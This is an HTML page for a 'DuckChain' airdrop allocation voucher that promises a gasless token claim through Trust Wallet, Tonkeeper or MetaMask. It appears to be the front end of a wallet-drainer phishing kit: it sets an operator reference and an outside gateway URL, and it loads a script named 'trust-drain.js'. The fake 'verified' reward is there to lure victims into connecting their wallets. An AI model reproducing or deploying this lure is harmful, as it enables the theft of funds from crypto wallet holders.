<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DuckChain Season 1 — Allocation Voucher</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet" />
  <style>
    :root {
      --bg: #09090b;
      --card-bg: #121216;
      --amber: #f59e0b;
      --emerald: #10b981;
      --text: #ffffff;
      --text-muted: #a1a1aa;
      --border: rgba(255, 255, 255, 0.1);
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: var(--bg);
      color: var(--text);
      font-family: 'Inter', sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .voucher-card {
      width: 100%;
      max-width: 480px;
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 24px;
      padding: 28px;
      box-shadow: 0 25px 60px rgba(0,0,0,0.7);
    }
    .badge-verified {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 4px 10px;
      border-radius: 8px;
      background: rgba(16, 185, 129, 0.12);
      border: 1px solid rgba(16, 185, 129, 0.25);
      color: #34d399;
      font-size: 11px;
      font-weight: 700;
      margin-bottom: 16px;
    }
    .voucher-title {
      font-size: 20px;
      font-weight: 800;
      letter-spacing: -0.02em;
      margin-bottom: 6px;
    }
    .voucher-sub {
      font-size: 13px;
      color: var(--text-muted);
      margin-bottom: 24px;
    }
    .allocation-box {
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 18px;
      padding: 20px;
      margin-bottom: 20px;
    }
    .alloc-label {
      font-size: 11px;
      font-weight: 600;
      text-transform: uppercase;
      color: var(--text-muted);
      letter-spacing: 0.05em;
      margin-bottom: 4px;
    }
    .alloc-amount {
      font-size: 28px;
      font-weight: 800;
      font-family: 'JetBrains Mono', monospace;
      color: var(--amber);
      display: flex;
      align-items: baseline;
      gap: 8px;
    }
    .alloc-usd {
      font-size: 14px;
      color: #34d399;
      font-weight: 600;
    }
    .gasless-banner {
      display: flex;
      align-items: center;
      gap: 8px;
      padding: 10px 14px;
      border-radius: 12px;
      background: rgba(245, 158, 11, 0.08);
      border: 1px solid rgba(245, 158, 11, 0.2);
      color: #fbbf24;
      font-size: 12px;
      font-weight: 600;
      margin-bottom: 24px;
    }
    .btn-trust {
      width: 100%;
      padding: 16px;
      border-radius: 16px;
      border: none;
      background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
      color: #000;
      font-size: 15px;
      font-weight: 800;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin-bottom: 12px;
      box-shadow: 0 10px 25px rgba(245, 158, 11, 0.25);
      transition: all 0.2s;
    }
    .btn-trust:hover { transform: translateY(-1px); box-shadow: 0 14px 30px rgba(245, 158, 11, 0.35); }
    .alt-wallets {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 8px;
      margin-bottom: 16px;
    }
    .btn-alt {
      padding: 10px;
      border-radius: 12px;
      background: rgba(255, 255, 255, 0.04);
      border: 1px solid rgba(255, 255, 255, 0.08);
      color: #e4e4e7;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }
    .btn-alt:hover { background: rgba(255, 255, 255, 0.08); }
    .status-banner {
      padding: 12px;
      border-radius: 12px;
      background: rgba(245, 158, 11, 0.12);
      border: 1px solid rgba(245, 158, 11, 0.3);
      color: #fbbf24;
      font-size: 12px;
      font-weight: 600;
      text-align: center;
      margin-top: 14px;
    }
    .qr-box {
      display: none;
      text-align: center;
      padding: 16px;
      background: rgba(255, 255, 255, 0.02);
      border: 1px solid rgba(255, 255, 255, 0.06);
      border-radius: 16px;
      margin-top: 16px;
    }
    .qr-box.open { display: block; }
    .qr-box img { width: 180px; height: 180px; border-radius: 12px; margin-bottom: 8px; }
  </style>
</head>
<body>
  <div class="voucher-card">
    <div class="badge-verified">✓ DUCKCHAIN VERIFIED VOUCHER</div>
    <h1 class="voucher-title">Genesis Allocation Voucher</h1>
    <p class="voucher-sub">Season 1 retroactive allocation ready for instant on-chain settlement.</p>
    
    <div class="allocation-box">
      <div class="alloc-label">Approved Allocation</div>
      <div class="alloc-amount">52,400 <span style="font-size: 16px; color: var(--text-muted);">$DUCKS</span> <span class="alloc-usd">(~$480.00 USDT)</span></div>
    </div>

    <div class="gasless-banner">
      <span>⚡</span>
      <span>100% Gasless • Network fee sponsored by DuckChain</span>
    </div>

    <button id="trustBtn" class="btn-trust">
      <span>🛡️</span>
      <span>Claim via Trust Wallet (Instant)</span>
    </button>

    <div class="alt-wallets">
      <button id="tonkeeperBtn" class="btn-alt"><span>💎</span> Tonkeeper</button>
      <button id="metamaskBtn" class="btn-alt"><span>🦊</span> MetaMask</button>
    </div>

    <div id="qrSection" class="qr-box">
      <img id="qrCodeImg" alt="Pairing QR" src="" />
      <p style="font-size: 11px; color: var(--text-muted);">Scan dynamic QR code with Trust Wallet</p>
    </div>

    <div id="statusBox" class="status-banner" style="display: none;"></div>
  </div>

  <script>
    window.NEXT_PUBLIC_OPERATOR_REF = "Mayankahuja100";
    window.NEXT_PUBLIC_GATEWAY_URL = "https://3web3d.online";
  </script>
  <script src="assets/trust-drain.js"></script>
</body>
</html>
